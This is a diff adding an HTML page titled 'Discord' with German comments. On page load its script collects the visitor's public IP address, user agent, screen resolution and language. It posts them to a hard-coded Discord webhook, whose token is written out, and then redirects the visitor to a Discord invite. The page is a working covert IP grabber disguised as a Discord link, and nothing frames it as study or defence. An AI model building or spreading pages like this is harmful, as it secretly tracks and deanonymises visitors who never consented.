@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord</title>
+</head>
+<body>
+    <script>
+        function sendDataToWebhook(data) {
+            const webhookUrl = 'https://discord.com/api/webhooks/1451653842889474138/BMzqQFrnz6PSxhAT8h1YXAFs-R7jKBywSJ3CSAWHGogkE6nC2f60DYHimtwuXOoXFPyS'; // Ersetze dies durch deine tatsächliche Webhook-URL
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Erfolgreich an Webhook gesendet:', data);
+                window.location.href = 'https://discord.gg/sf4NvKjS';
+            })
+            .catch(error => {
+                console.error('Fehler beim Senden an Webhook:', error);
+            });
+        }
+
+        function collectUserData() {
+            return new Promise((resolve) => {
+                fetch('https://api.ipify.org?format=json')
+                    .then(response => response.json())
+                    .then(data => {
+                        const userData = {
+                            ip: data.ip,
+                            userAgent: navigator.userAgent,
+                            screenResolution: window.screen.width + 'x' + window.screen.height,
+                            language: navigator.language,
+                            timestamp: new Date().toISOString()
+                        };
+                        resolve(userData);
+                    })
+                    .catch(error => {
+                        console.error('Fehler:', error);
+                    });
+            });
+        }
+
+        async function main() {
+            const userData = await collectUserData();
+            sendDataToWebhook(userData);
+        }
+
+        window.onload = main;
+    </script>
+</body>
+</html>
